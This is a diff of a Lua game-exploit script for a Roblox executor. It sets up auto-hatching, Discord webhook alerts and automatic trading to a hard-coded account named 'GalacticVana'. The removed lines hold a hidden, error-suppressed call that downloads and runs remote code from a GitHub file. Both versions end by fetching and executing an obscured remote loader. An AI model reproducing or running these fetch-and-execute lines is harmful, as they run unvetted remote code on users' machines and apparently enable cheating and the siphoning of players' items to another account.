@@ -1,25 +1,18 @@
-task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/friend.lua"))()
-    end)
-end)
+getgenv().Settings = {
+    ["Open Egg"] = "200M Egg",
 
-getgenv().Config = {
-    ["Hatching"] = {
-        ["Rifts"] = {
-            ["Eggs"] = {"Silly Egg", "Nightmare Egg"}
-        },
-        ["Egg"] = "100M Egg"
-    },
-    ["Webhook"] = {
-        ["MinDifficulty"] = "10k",
-        ["UserID"] = "314107374715535370",
-        ["URL"] = dc_webhook,
-    },
-    ["AutoTrade"] = {
-        ["Usernames"] = {"GalacticVana"}, -- Receiver Accounts
-        ["URL"] = dc_webhook
-    },
-    ["AutoEnchant"] = true -- // Enchant Team Up on all Equipped Pets
+    ["Target Rifts"] = {"Underworld Egg"},
+    ["Minimum Rift Luck"] = 10,
+    ["Target Highest Luck"] = true,
+
+    ["Webhook"] = dc_webhook,
+    ["Discord ID"] = "314107374715535370",
+    ["Minimum Send Difficulty"] = "1k",
+
+    ["Trade Users"] = {"GalacticVana"},
+
+    ["Debug"] = {
+        DisableUI = false,
+    }
 }
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/6a28683e5e681161a5074613f6daf64c.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fb6f3bc2f2e7dd88042fac40addd4d57.lua"))()
